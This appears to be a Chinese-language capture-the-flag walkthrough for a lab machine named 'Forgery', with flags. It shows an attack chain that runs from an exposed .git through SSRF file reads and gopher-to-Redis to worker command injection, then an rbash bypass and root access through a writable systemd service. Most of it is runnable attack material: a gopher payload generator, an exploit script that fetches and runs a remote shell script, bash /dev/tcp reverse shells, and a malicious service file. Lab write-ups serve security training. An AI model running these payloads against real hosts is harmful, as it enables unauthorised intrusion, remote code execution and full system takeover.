# 信息收集

```bash
IP=192.168.205.205
nmap -p- $IP
...
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
...
```

只有 SSH 和 HTTP。80 端口跑的是 Apache/2.4.67 on Debian，直接看 Web。

页面是一个带浏览器截图的 URL 请求工具，地址栏输入地址能看到网页预览。跑一下目录扫描。

```bash
dirsearch -q -u http://$IP/
```

扫出来 `.git` 目录完整暴露，还有一个 `api.php`。

```bash
curl -s http://$IP/api.php
```

返回 `缺少参数: url`，是个接收 URL 参数的接口。`.git` 暴露了，先把源码拖下来。

# 源码还原

## git-dumper 拉取

```bash
git-dumper http://$IP/ /tmp/205/
cd /tmp/205
git log --all --oneline
```

```
f537279 (HEAD -> master) Backup request handler
15689a1 Initial commit
```

只有两个 commit，checkout 出来 `api.php`、`browser.png`、`index.html`，没有别的东西。

## api.php 关键逻辑

```php
$url = escapeshellarg($_GET['url']);
$redis = new Redis();
$redis->connect('127.0.0.1', 6379);
$requestId = uniqid("", true);
$requestData = json_encode(['id' => $requestId, 'url' => $url]);
$redis->lPush('URLqueue', $requestData);
```

PHP 端把用户传入的 URL 用 `escapeshellarg` 包一层，序列化成 JSON 推进 Redis 队列 `URLqueue`，然后轮询等结果返回。后端肯定还有个 worker 从队列取 URL 去请求，但 git 里没有这个 worker 的源码，先记下来。

# SSRF 探测

`api.php` 接收 URL 去请求，这是个典型 SSRF 场景。先试 `file://` 读本地文件：

```bash
curl -s "http://$IP/api.php?url=file:///var/www/html/api.php" | base64 -d
```

响应是 base64 编码的，解码后能读到 `api.php` 自身，`file://` 协议可用。

> 这里有个教训：我当时也顺手读了 `/etc/passwd`，但没仔细看内容就继续往下打了。后来回头才发现 yepian 用户的密码字段是空的（`yepian::1000:1000::/home/yepian:/bin/rbash`，第二个字段没有 `x` 占位），意味着可以直接 SSH 无密码登录。如果当时细看了，横向移动那步能少绕一段路。

再试 gopher 打内网 Redis。写个脚本生成 gopher payload 发 Redis INFO 命令，保存为 `info.py`：

```python
import urllib.parse

def gen_redis_cmd(*args):
    p = f"*{len(args)}\r\n"
    for a in args:
        p += f"${len(a)}\r\n{a}\r\n"
    return p

payload = gen_redis_cmd("INFO", "server")
gopher = "gopher://127.0.0.1:6379/_" + urllib.parse.quote(payload)
final = urllib.parse.quote(gopher)
print(f"http://192.168.205.205/api.php?url={final}")
```

```bash
python3 info.py | xargs curl -s | base64 -d
```

确认 Redis 8.0.2 可达。试了 CONFIG SET 写 webshell 到 `/var/www/html`：

```
-ERR CONFIG SET failed (possibly related to argument 'dir') - can't set protected config
```

Redis 8 默认启用了 protected config，`dir` 和 `dbfilename` 都改不了，写文件这条路走不通。

# 发现 Worker

Redis 写文件不行，回头去找那个从队列取数据的 worker。既然 `file://` 能读文件，先看 systemd 服务列表里有什么：

```bash
curl -s "http://$IP/api.php?url=file:///etc/systemd/system/" | base64 -d
```

输出里有个 `handler.service`，读它：

```bash
curl -s "http://$IP/api.php?url=file:///etc/systemd/system/handler.service" | base64 -d
```

```
ExecStart=/usr/bin/python3 /opt/handler/main.py
User=www-data
```

worker 在 `/opt/handler/main.py`，以 www-data 跑。继续读源码：

```bash
curl -s "http://$IP/api.php?url=file:///opt/handler/main.py" | base64 -d
```

关键部分：

```python
def ProcessUrl(url):
    cmd = f"curl -s --max-time 1 --url {url} 2>&1"
    proc = subprocess.run(cmd, shell=True, capture_output=True)
    return base64.b64encode(proc.stdout).decode('utf-8')
```

命令注入点就在这。Python 端从 Redis 队列取出 JSON 里的 `url` 字段，直接用 f-string 拼进 shell 命令，`shell=True` 执行，没有任何过滤。

PHP 端的 `escapeshellarg` 只保护从 `api.php` 正常提交的路径。绕过 `api.php`，用 gopher 直接往 Redis 队列里塞恶意 JSON，`url` 字段里的命令注入就会被 worker 原样执行。

> 顺带一提，看菜叶片的 WP，他这台机器 `main.py` 是从 git 不可达对象里恢复出来的（`git fsck --unreachable` 列出被删引用的 commit，再 `git show` 拿源码）。git-dumper 基于引用关系遍历，遇到被 reset 或删分支的 commit 就会遗漏，那种情况下 wget 递归下载整个 `.git` 再 `git fsck` 更稳妥。我这条路是 SSRF 直接读 `/opt/handler/main.py`，殊途同归。

# 初始突破

## RESP 协议

Redis 客户端与服务端通信用 RESP 协议，命令以数组形式发送。比如 `LPUSH URLqueue "somedata"` 对应：

```
*3\r\n
$5\r\nLPUSH\r\n
$8\r\nURLqueue\r\n
$N\r\n{json}\r\n
```

curl 不支持直接发 RESP，但 `gopher://` 可以发任意 TCP 数据。格式是 `gopher://host:port/_<URL编码的字节序列>`，第一个字符 `_` 会被丢弃，后面的内容原样发送。

## 构造 Exploit

Kali 上准备反弹 shell 脚本，保存为 `rev.sh`：

```bash
bash -i >& /dev/tcp/192.168.205.128/8888 0>&1
```

开 HTTP 服务托管：

```bash
python3 -m http.server 80
```

写 exploit 脚本，保存为 `exploit.py`：

```python
import urllib.parse
import json

def gen_redis_cmd(*args):
    p = f"*{len(args)}\r\n"
    for a in args:
        p += f"${len(a)}\r\n{a}\r\n"
    return p

req_id = "pwned002"
malicious_url = "http://x;curl http://192.168.205.128/rev.sh -o /tmp/rev.sh;bash /tmp/rev.sh"
data = json.dumps({"id": req_id, "url": malicious_url})
payload = gen_redis_cmd("LPUSH", "URLqueue", data)
gopher = "gopher://127.0.0.1:6379/_" + urllib.parse.quote(payload)
final = urllib.parse.quote(gopher)
print(f"http://192.168.205.205/api.php?url={final}")
```

这段绕过了 `api.php` 的 `escapeshellarg`，直接往 Redis 队列塞了条恶意 JSON。worker 取出来后 `url` 字段被拼进 `curl -s --max-time 1 --url http://x;curl ...;bash /tmp/rev.sh 2>&1`，分号后面的命令被 bash 执行。

## 触发反弹

```bash
nc -lvnp 8888
```

```bash
python3 exploit.py | xargs curl -s
```

监听端收到 shell：

```
www-data@Forgery:/home$
```

# 横向移动

## 发现 yepian 用户

```bash
cat /etc/passwd | grep sh$
```

```
root:x:0:0:root:/root:/bin/bash
yepian::1000:1000::/home/yepian:/bin/rbash
```

yepian 密码字段为空，无密码。shell 是 `/bin/rbash`。

## rbash 绕过

已经有了 www-data 的 shell，`su` 的时候用 `-s` 参数指定 shell，绕开 rbash：

```bash
su -s /bin/bash yepian
```

一步到位拿到 yepian 的 bash shell。

> 如果是按出题预期从 SSH 无密码登 yepian，会直接撞上完整的 rbash 限制：`$PATH` 只有 `/opt/rbash_cmds`，里面没放可用二进制，不能 `cd`、不能用 `/` 指定路径、不能改 `PATH`。菜叶片的 WP 里给了两个解法，一个是 `echo "$(</etc/passwd)"`（echo 是 bash 内建，配合 `$(<file)` 语法糖在无外部二进制情况下读文件），另一个是利用 `/opt/rbash_cmds` 权限 777，往里面软链一个 bash 再登录脱困。我走的 www-data 到 yepian 这条路用不上这些，记一下当扩展。

# 提权

## handler.service 可写

跑 linpeas 发现 `/etc/systemd/system/handler.service` 可写：

```bash
ls -al /etc/systemd/system/handler.service
```

```
-rw-r--r-- 1 yepian yepian 295 Jun  4 09:29 /etc/systemd/system/handler.service
```

yepian 拥有这个 systemd service 文件，可以直接改。当前 handler 以 www-data 跑，改成 root 配合反弹 shell 就行。

## 修改 service 文件

用 vi 编辑 `/etc/systemd/system/handler.service`：

```ini
[Unit]
Description=req handler
After=network.target
[Service]
Type=simple
User=root
Group=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/192.168.205.128/8888 0>&1'
Restart=on-failure
RestartSec=2
[Install]
WantedBy=multi-user.target
```

## 触发

改完 service 文件正常要 `systemctl daemon-reload`，但 yepian 没这权限。有人会想到用 `Restart=on-failure` 杀进程让服务崩溃重启，但 systemd 在 daemon-reload 之前不会重新解析已加载的 service 文件，重启服务也是用内存里的旧配置。没有 reload 权限的话，重启机器是唯一可靠的触发方式。

Kali 上开监听：

```bash
nc -lvnp 8888
```

重启靶机，handler 以 root 执行反弹 shell：

```
root@Forgery:/# id
uid=0(root) gid=0(root) groups=0(root)
```

# Flag

```bash
cat /home/yepian/user.txt /root/root.txt
```

```
flag{user-24900750c5c03ffe834248ba2e145cfa}
flag{root-3b124dc0b2553d41c27d853b197c1043}
```